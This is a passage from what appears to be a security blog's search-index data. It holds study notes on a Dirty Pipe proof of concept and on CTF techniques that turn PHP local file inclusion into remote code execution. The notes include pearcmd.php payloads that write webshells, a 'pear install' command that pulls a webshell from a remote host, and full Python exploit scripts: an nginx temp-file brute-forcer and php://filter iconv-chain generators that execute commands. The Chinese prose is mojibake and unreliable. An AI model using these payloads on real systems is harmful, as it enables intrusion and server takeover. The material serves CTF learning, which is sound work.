splice\\n\u0026#34;); return EXIT_FAILURE; } /* the following write will not create a new pipe_buffer, but will instead write into the page cache, because of the PIPE_BUF_FLAG_CAN_MERGE flag */ nbytes = write(p[1], data, data_size); if (nbytes \u0026lt; 0) { perror(\u0026#34;write failed\u0026#34;); return EXIT_FAILURE; } if ((size_t)nbytes \u0026lt; data_size) { fprintf(stderr, \u0026#34;short write\\n\u0026#34;); return EXIT_FAILURE; } printf(\u0026#34;It worked!\\n\u0026#34;); return EXIT_SUCCESS; } è¿™ä¸ªpocæ¯”è¾ƒç²—ç³™ï¼Œéœ€è¦æŒ‡å®šè¦†ç›–å“ªä¸ªæ–‡ä»¶ï¼Œä»ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹å†™ï¼Œå†™å…¥ä»€ä¹ˆå†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†passwdä¸­rootçš„å¯†ç ç½®ç©ºï¼Œç„¶åå†åœ¨æè¿°å¤„å¡«å……å­—ç¬¦ï¼Œè¾¾åˆ°ææƒçš„ç›®çš„ã€‚\nPOC2 å¦ä¸€ä¸ªpocç›´æ¥ä¿®æ”¹å…·æœ‰suidçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ææƒï¼Œæœ€åå†æŠŠè¿™ä¸ªæ–‡ä»¶æ”¹å›æ¥ï¼šhttps://haxx.in/files/dirtypipez.c\nè¸©å‘ åˆšå¼€å§‹æƒ³åœ¨dockerä¸Šå¤ç°ï¼Œæ‹‰çš„æ˜¯ubuntu:lastestï¼Œä½†æ˜¯å°è¯•æ‰§è¡Œdpkg -i linux-*.debçš„æ—¶å€™æŠ¥é”™ï¼š\n1 2 3 4 5 dpkg: dependency problems prevent configuration of linux-image-unsigned-5.8.0-050800-generic: linux-image-unsigned-5.8.0-050800-generic depends on kmod; however: Package kmod is not installed. linux-image-unsigned-5.8.0-050800-generic depends on linux-base (\u0026gt;= 4.5ubuntu1~16.04.1); however: Package linux-base is not installed. åé¢å°è¯•æ‰§è¡Œupdate-grubä¹ŸæŠ¥é”™ï¼š/usr/sbin/grub-probe: error: failed to get canonical path of 'overlay'\nä½†æ˜¯çœ‹pç¥çš„æ–‡ç« å°±æ˜¯åœ¨dockerä¸­å¤ç°çš„ï¼Œå› ä¸ºå¯¹dockeræ²¡æœ‰å¾ˆæ·±çš„ç ”ç©¶åŠç†è§£ï¼Œæ‰€ä»¥æ²¡èƒ½è§£å†³ï¼Œç­‰ä»¥åæœ‰ç©ºå†å¡«å‘å§\nå‚è€ƒ https://t.zsxq.com/vJ2zjaI\nThe Dirty Pipe Vulnerability â€” The Dirty Pipe Vulnerability documentation (cm4all.com)\n","date":"2022-03-12T20:32:23+08:00","permalink":"https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/","title":"Dirty_pipeå¤ç°"},{"content":"å‰å‡ å¤©pç‰›åœ¨æ˜Ÿçƒé‡Œåˆ†äº«äº†æ–°çš„LFIæŠ€å·§ï¼Œåˆšå¥½è€ƒå®Œè¯•äº†è¿‡æ¥å­¦ä¹ ä¸€ä¸‹\npearcmd.php config-create è¿™ä¸ªå¹¶ä¸æ˜¯ä¸Šé¢è¯´çš„æ–°trickï¼Œè€Œæ˜¯pç‰›åä¸€æœˆä»½å°±å‘äº†çš„ï¼šDocker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿° | ç¦»åˆ«æ­Œ (leavesongs.com)ï¼Œå½“æ—¶åä¸€æœˆä»½æ¹–æ¹˜æ¯æˆ‘ä»¬è¿˜åœ¨è¾›è‹¦åœ°sessionæ–‡ä»¶åŒ…å«ï¼Œç»“æŸåå‘ç°å¤§å®¶éƒ½æ˜¯ç”¨pearcmd.phpï¼Œåªèƒ½è¯´å¤šå­¦ä¹ ã€‚å…·ä½“åŸç†å‚è€ƒä¸Šé¢pç‰›çš„æ–‡ç« ï¼Œè¿™é‡Œå°±å•çº¯åšä¸ªè®°å½•æ–¹ä¾¿è‡ªå·±æŸ¥é˜…\nè¿™é‡Œä½¿ç”¨çš„æ˜¯2021æ¹–æ¹˜æ¯easywillï¼Œå¦‚æœä»¿ç…§pç‰›çš„payloadï¼Œé‚£ä¹ˆæœ€ç»ˆçš„payloadå¦‚ä¸‹ï¼š\n1 ?+config-create+/\u0026amp;name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;/\u0026lt;?=phpinfo()?\u0026gt;+/tmp/hello.php (æ³¨æ„ï¼Œè¯·ä½¿ç”¨burpå‘åŒ…ï¼Œå¦åˆ™å°–æ‹¬å·ä¼šè¢«urlç¼–ç ï¼Œæ­¤å¤„åªæ˜¯æ¼”ç¤º)\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„nameå’Œvalueå˜é‡æˆåŠŸä¼ å…¥ï¼ŒåŒæ—¶$_SERVER['argv']ä¹ŸæˆåŠŸè§£æï¼Œéœ€è¦æ³¨æ„çš„æ˜¯config-createå¿…é¡»åœ¨$_SERVER['argv']æ•°ç»„çš„ç¬¬äºŒä¸ªä½ç½®ï¼Œç„¶ååé¢ä¸¤ä¸ªå‚æ•°ç´§éšå…¶åï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥config-createå‰é¢è¿˜æœ‰ä¸€ä¸ª+å·ï¼Œä½¿å¾—ç¬¬0ä¸ªå…ƒç´ ä¸ºç©ºï¼Œè¿™ä¸ªåº”è¯¥æ˜¯phpæºç çš„å¤„ç†ï¼Œè¿™é‡Œå°±æ²¡æœ‰å†å¾€ä¸‹è·Ÿäº†ã€‚\nç»¼ä¸Šï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†payloadæ”¹æˆï¼š\n1 /?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+config-create+/\u0026lt;?=phpinfo()?\u0026gt;+/tmp/hello.php å¯ä»¥å®ç°åŒæ ·çš„æ•ˆæœ\ninstall åœ¨å­¦ä¹ pç‰›æ–‡ç« çš„è¿‡ç¨‹ä¸­æ‰¾åˆ°äº†bfengjå¸ˆå‚…çš„ä¸€ç¯‡æ–‡ç« ï¼šåˆ©ç”¨pearcmd.phpä»LFIåˆ°getshellï¼Œé‡Œé¢ä»‹ç»äº†pearçš„å¦ä¸€ä¸ªåˆ©ç”¨æ–¹æ³•ï¼š\n1 pear install -R /tmp http://xxxxxxx/shell.php è¿™ä¸ªæ–¹æ³•å¯ä»¥ç›´æ¥æŠŠæˆ‘ä»¬çš„webshellä¸‹è½½åˆ°é¶æœºä»è€Œå®ç°RCE\nå›åˆ°æˆ‘ä»¬easywillçš„ç¯å¢ƒï¼Œpayloadï¼š\n1 url?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+install+-R+/tmp+http://ip:port/info.php åŒæ—¶ï¼Œåœ¨è¿™ç‰‡æ–‡ç« ä¸­è¿˜å­¦åˆ°äº†config-createçš„å¦ä¸€ä¸ªç”¨æ³•ï¼š\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨pear -c file -d foo=bar -sè¾¾åˆ°åŒæ ·çš„å†™é…ç½®æ–‡ä»¶çš„ç›®çš„ï¼Œåœ¨easywillä¸­çš„payloadå¦‚ä¸‹ï¼š\n1 /?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+-c+/tmp/shell.php+-d+man_dir=\u0026lt;?eval($_POST[0]);?\u0026gt;+-s+ æœ€åä¸€ä¸ª+å·å¥½åƒæ²¡æœ‰ä¹Ÿå¯ä»¥ã€‚\né™åˆ¶ ä»Šå¤©æ—©ä¸Šå†™çš„æ—¶å€™åˆšå¥½åœ¨pç‰›çš„æ˜Ÿçƒçœ‹åˆ°Smityå¸ˆå‚…å‘çš„æ–‡ç« ï¼Œå¤§æ¦‚æ„æ€æ˜¯phpå®˜æ–¹çš„é•œåƒç¡®å®å¦‚pç‰›æ‰€è¯´ï¼Œä½†æ˜¯å¦‚æœæ˜¯ä½¿ç”¨apt install phpä¸‹è½½çš„phpï¼ˆæ®è¯¥å¸ˆå‚…æ‰€è¨€ï¼Œå¤§å¤šæ•°ctf dockerçš„åˆ¶ä½œæ–¹å¼éƒ½æ˜¯è¿™ä¸ªï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªç¯å¢ƒå°±å’ŒPç‰›æ‰€è¯´çš„ç¯å¢ƒæœ‰ä¸¤ä¸ªä¸åŒï¼š\npearcmd.phpåœ¨/usr/share/php/pearcmd.php register_argc_argvåœ¨php.iniä¸­é»˜è®¤å…³é—­ å¦‚æœè¯´ç¬¬ä¸€ä¸ªè¿˜å¯ä»¥è°ƒæ•´ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªé™åˆ¶åˆ™æ˜¯è‡´å‘½çš„ã€‚\nå¯èƒ½æ˜¯æˆ‘çš„è¿æ°”æ¯”è¾ƒå¥½ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘æ¯”è¾ƒæ‡’ï¼Œeasywillçš„ç¯å¢ƒæˆ‘åˆšå¥½æ˜¯æ ¹æ®phpå®˜æ–¹é•œåƒæ­å»ºçš„ï¼Œæ‰€ä»¥æ²¡è¸©åˆ°è¿™ä¸ªå‘ã€‚\nåˆ©ç”¨ Nginx äº§ç”Ÿä¸´æ—¶æ–‡ä»¶ è¿™ä¸ªæŠ€å·§æ¥æºäºhxp2021ï¼Œä¸è¿‡æˆ‘å¹¶æ²¡æœ‰æ‰“è¿™ä¸ªæ¯”èµ›ï¼Œè€Œæ˜¯å¦‚å¼€å¤´æ‰€è¯´é€šè¿‡pç‰›çš„æ˜Ÿçƒäº†è§£åˆ°çš„ï¼Œçœ‹äº†Zeddyå¤§ä½¬çš„æ–‡ç« åªèƒ½è¯´å¹ä¸ºè§‚æ­¢ã€‚\næ€»ç»“èµ·æ¥æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯ï¼š\nè®©åç«¯ php è¯·æ±‚ä¸€ä¸ªè¿‡å¤§çš„æ–‡ä»¶ Fastcgi è¿”å›å“åº”åŒ…è¿‡å¤§ï¼Œå¯¼è‡´ Nginx éœ€è¦äº§ç”Ÿä¸´æ—¶æ–‡ä»¶è¿›è¡Œç¼“å­˜ è™½ç„¶ Nginx åˆ é™¤äº†/var/lib/nginx/fastcgiä¸‹çš„ä¸´æ—¶æ–‡ä»¶ï¼Œä½†æ˜¯åœ¨ /proc/pid/fd/ ä¸‹æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¢«åˆ é™¤çš„æ–‡ä»¶ éå† pid ä»¥åŠ fd ï¼Œä½¿ç”¨å¤šé‡é“¾æ¥ç»•è¿‡ PHP åŒ…å«ç­–ç•¥å®Œæˆ LFI è¿™é‡Œç›´æ¥ç”¨å‡ºé¢˜äººçš„expæ”¹äº†ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 #!/usr/bin/env python3 import sys, threading, requests # exploit PHP local file inclusion (LFI) via nginx\u0026#39;s client body buffering assistance # see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details URL = f\u0026#39;http://{sys.argv[1]}:{sys.argv[2]}/index.php\u0026#39; # find nginx worker processes r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: \u0026#39;/proc/cpuinfo\u0026#39; }) cpus = r.text.count(\u0026#39;processor\u0026#39;) r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: \u0026#39;/proc/sys/kernel/pid_max\u0026#39; }) pid_max = int(r.text) print(f\u0026#39;[*] cpus: {cpus}; pid_max: {pid_max}\u0026#39;) nginx_workers = [] for pid in range(pid_max): r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: f\u0026#39;/proc/{pid}/cmdline\u0026#39; }) if b\u0026#39;nginx: worker process\u0026#39; in r.content: print(f\u0026#39;[*] nginx worker found: {pid}\u0026#39;) nginx_workers.append(pid) if len(nginx_workers) \u0026gt;= cpus: break done = False # upload a big client body to force nginx to create a /var/lib/nginx/body/$X def uploader(): print(\u0026#39;[+] starting uploader\u0026#39;) while not done: requests.get(URL, data=\u0026#39;\u0026lt;?php system($_GET[\u0026#34;c\u0026#34;]); /*\u0026#39; + 16*1024*\u0026#39;A\u0026#39;) for _ in range(16): t = threading.Thread(target=uploader) t.start() # brute force nginx\u0026#39;s fds to include body files via procfs # use ../../ to bypass include\u0026#39;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)` def bruter(pid): global done while not done: print(f\u0026#39;[+] brute loop restarted: {pid}\u0026#39;) for fd in range(4, 32): f = f\u0026#39;/proc/self/fd/{pid}/../../../{pid}/fd/{fd}\u0026#39; r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: f, \u0026#39;c\u0026#39;: f\u0026#39;id\u0026#39; }) if \u0026#39;uid\u0026#39; in r.text: print(f\u0026#39;[!] {f}: {r.text}\u0026#39;) done = True exit() for pid in nginx_workers: a = threading.Thread(target=bruter, args=(pid, )) a.start() åŸæœ¬æ˜¯ç›´æ¥æ‹¿phpå®˜æ–¹é•œåƒæ­çš„çš„ç¯å¢ƒï¼Œç»“æœå‘ç°å®˜æ–¹é•œåƒåªæœ‰php-apacheï¼Œæ²¡æœ‰nginxï¼Œç„¶åè‡ªå·±åˆæ­äº†ä¸€ä¼šå„¿nginxï¼Œä»¥åŠåˆšå¼€å§‹è·‘è„šæœ¬è·‘å‡ºæ¥äº†logï¼Œåº”è¯¥æ˜¯willphpæ¡†æ¶æ‰“å¼€çš„logï¼Œåé¢åŠ äº†â€œuidâ€çš„åˆ¤æ–­æ¡ä»¶å°±èƒ½æ­£å¸¸æŠŠidè·‘å‡ºæ¥äº†\nä½¿ç”¨php://filterå°†ä»»æ„æ–‡ä»¶è½¬æ¢æˆWebshell è¿™ä¸ªæ¥æºäºhxp2021çš„å¦ä¸€é¢˜counterï¼Œå›½å¤–ä¸€ä¸ªå¤§ä½¬çš„éé¢„æœŸè§£æ³•ï¼šhttps://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\nè¿™é‡Œä¸»è¦å‚è€ƒZeddyå¸ˆå‚…çš„æ–‡ç« ï¼Œçœ‹ä¹‹å‰å·²ç»å¤§æ¦‚çŸ¥é“äº†è¿™ä¸ªtrickçš„æ€è·¯ï¼Œå½“æ—¶å·²ç»ååˆ†éœ‡æƒŠäº†ï¼Œä½†æ˜¯å½“æˆ‘çœ‹åˆ°æ–‡ç« é‡Œä»¤äººçœ¼èŠ±ç¼­ä¹±çš„å­—ç¬¦é›†è½¬æ¢ï¼Œæœ€åè½¬æ¢å‡ºäº†webshellï¼Œå†ä¸€æ¬¡è¢«éœ‡æ’¼åˆ°äº†ï¼ŒçœŸçš„å¤ªç‰›äº†\nä¸»è¦çš„æ€è·¯å°±æ˜¯åˆ©ç”¨phpä¼ªåè®®çš„è½¬æ¢è¿‡æ»¤å™¨ï¼Œé€šè¿‡å­—ç¬¦é›†è½¬æ¢æ¥ç”Ÿæˆç‰¹å®šçš„å†…å®¹ï¼ŒåŒæ—¶åˆ©ç”¨base64â€œå®½æ¾çš„è§£æâ€ï¼ˆå½“éœ€è¦è§£æçš„å­—ç¬¦ä¸²ä¸­å«æœ‰base64è¡¨ä¸­ä¸å­˜åœ¨çš„å­—ç¬¦æ—¶ï¼Œä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯å°†å…¶ä¸¢å¼ƒå¹¶ç»§ç»­è§£æï¼‰ï¼Œå°†å…¶ä¸­ä¸å¯è§çš„å­—ç¬¦ä¸¢æ‰ï¼Œåªå‰©ä¸‹æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚\nè¯»å®Œä¸Šé¢è¿™æ®µè¯æˆ‘ä»¬å°±ä¼šå‘ç°ï¼Œå¦‚ä½•åˆ©ç”¨å­—ç¬¦é›†è½¬æ¢ç”Ÿæˆæˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼ˆfilter chainçš„å¯»æ‰¾ï¼‰å…¶å®æ˜¯è¿™ä¸ªtrickçš„æ ¸å¿ƒéƒ¨åˆ†ï¼ŒZeddyçš„æ–‡ç« ä¸­æœ‰è®²åˆ°è¯¥å¦‚ä½•fuzzï¼ŒåŒæ—¶wupcoå¸ˆå‚…ä¹Ÿç»™å‡ºäº†ç°æˆçš„ç»“æœä»¥åŠfuzzè„šæœ¬ï¼šhttps://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\nè¿™é‡Œå›åˆ°æˆ‘ä»¬çš„easywillï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹å›½å¤–å¤§ä½¬çš„expï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import requests url = \u0026#34;http://ip:port/index.php\u0026#34; file_to_use = \u0026#34;/etc/passwd\u0026#34; command = \u0026#34;id\u0026#34; #\u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = \u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, \u0026#34;name\u0026#34;: \u0026#34;cfile\u0026#34;, \u0026#34;value\u0026#34;: final_payload }) print(r.text) é™åˆ¶ è¿™ä¸ªtrickçš„é™åˆ¶æ— è®ºæ˜¯ä¸ŠåˆSmityå¸ˆå‚…çš„æ–‡ç« è¿˜æ˜¯Zeddyå¸ˆå‚…çš„æ–‡ç« ä¸‹é¢çš„è¯„è®ºéƒ½æœ‰æåˆ°è¿‡ï¼Œå°±æ˜¯æŸäº›å­—ç¬¦é›†åœ¨æŸäº›ç³»ç»Ÿå¹¶ä¸æ”¯æŒï¼Œæ¯”å¦‚Ubuntu18.04ï¼Œååˆ†å¹¸è¿ï¼Œphpå®˜æ–¹å¸¦apacheçš„é•œåƒæ˜¯Debainï¼Œè¿è¡Œä¸Šé¢çš„è„šæœ¬æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œè¿™é‡ŒçŒœæµ‹hxp2021çš„å‡ºé¢˜äººç”¨çš„ä¹Ÿæ˜¯åŒä¸€ä¸ªé•œåƒï¼ˆxsï¼‰\nè§£å†³çš„åŠæ³•å…¶å®å¹¶ä¸éš¾ï¼Œåªéœ€è¦å°†æ–°çš„å­—ç¬¦é›†æ”¾åˆ°wupcoå¸ˆå‚…çš„è„šæœ¬ä¸­å†è·‘ä¸€æ¬¡å°±å¯ä»¥äº†ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨Smityå¸ˆå‚…ä¸‹åˆæ–°å‘çš„expï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import requests #å‚æ•°file url = \u0026#34;http://192.168.190.191/index.php\u0026#34; file_to_use = \u0026#34;index\u0026#34; command = \u0026#34;whoami\u0026#34; #\u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = \u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; print(final_payload) r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, #\u0026#34;action\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;file\u0026#34;: final_payload }) print(r.text) ä½¿ç”¨compress.zlib://ç”Ÿæˆä¸´æ—¶æ–‡ä»¶ è¿™ä¸ªæ˜¯2019å¹´hxp36c3ctfé‡Œé¢includerçš„é¢„æœŸè§£ï¼ˆhxpä¹Ÿå¤ªçˆ±LFIäº†å§ï¼‰ï¼Œå¯¹å…¶ä»–å¸ˆå‚…ä»¬æ¥è¯´å¥½åƒä¸æ˜¯æ–°å§¿åŠ¿äº†ï¼Œä¸è¿‡æˆ‘æ˜¯é€šè¿‡includer's revengeä»¥åŠå¸ˆå‚…ä»¬çš„æ–‡ç« æ‰çŸ¥é“æœ‰è¿™ä¸ªæ–¹æ³•ï¼ˆæœ‰é€’å½’å¤ä¹ å†…å‘³äº†ï¼‰\nè¿™é‡Œè¿˜æ˜¯å­¦ä¹ Zeddyå¸ˆå‚…çš„æ–‡ç« 